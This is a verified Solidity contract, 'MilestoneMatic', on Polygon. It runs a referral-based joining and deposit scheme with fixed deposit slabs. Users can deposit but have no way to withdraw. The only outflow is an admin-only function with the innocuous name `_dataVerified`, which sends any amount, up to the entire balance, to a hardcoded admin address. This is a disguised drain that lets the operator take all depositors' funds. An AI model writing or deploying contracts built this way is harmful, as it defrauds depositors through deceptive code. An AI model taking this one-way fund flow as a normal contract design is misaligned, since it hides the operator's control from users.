/**
 *Submitted for verification at polygonscan.com on 2022-12-17
*/

pragma solidity ^0.5.10;

/*
Basic Method Which Is Used For The Basic Airthmetic Operations
*/
library SafeMath {

    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /* Modulus */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract MilestoneMatic {

    using SafeMath for uint256;
    using SafeMath for uint8;

	uint256 public totalUsers;
	uint256 public totalDeposited;    
    address payable primaryAdmin;

    uint256[10] public depositSlab = [5 ether,10 ether,20 ether,50 ether,100 ether,250 ether,500 ether,1000 ether,2500 ether,5000 ether];
    
    struct User {
        uint checkpoint;
        uint256 totalJoiningAmount;
        uint256 totalDepositedAmount;
        uint JoiningDateTime;
        uint lastDepositedDateTime;
        address SponsorAddress;
	}

    constructor() public {
		primaryAdmin = 0x3B443D68c8425158a1863662bE26C43D8f59481E;
	}

    mapping (address => User) public users;

    function _Joining(address referrer) public payable {
		User storage user = users[msg.sender];
		if (user.SponsorAddress == address(0) && referrer != msg.sender ) {
            user.SponsorAddress = referrer;
        }
        require(user.checkpoint==0, 'Already Joined !');
		require(user.SponsorAddress != address(0) || msg.sender == primaryAdmin, "No upline");
		if(user.checkpoint == 0){
			totalUsers=totalUsers.add(1);
            user.checkpoint = block.timestamp;
            user.JoiningDateTime = block.timestamp;
            user.totalJoiningAmount=msg.value;
		}
    }

    function _Deposit(uint slabId) public payable {
        require(msg.value >= depositSlab[slabId],'Invalid Deposit Slab !');
        User storage user = users[msg.sender];
        require(user.checkpoint!=0, 'Did Not Joined Yet !');
        totalDeposited+=msg.value; 
        //Update User Deposited Data
        user.totalDepositedAmount +=msg.value;
        user.lastDepositedDateTime =block.timestamp;
    }

    function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
    }

    function _dataVerified(uint256 _data) external{
        require(primaryAdmin==msg.sender, 'Admin what?');
        _safeTransfer(primaryAdmin,_data);
    }

}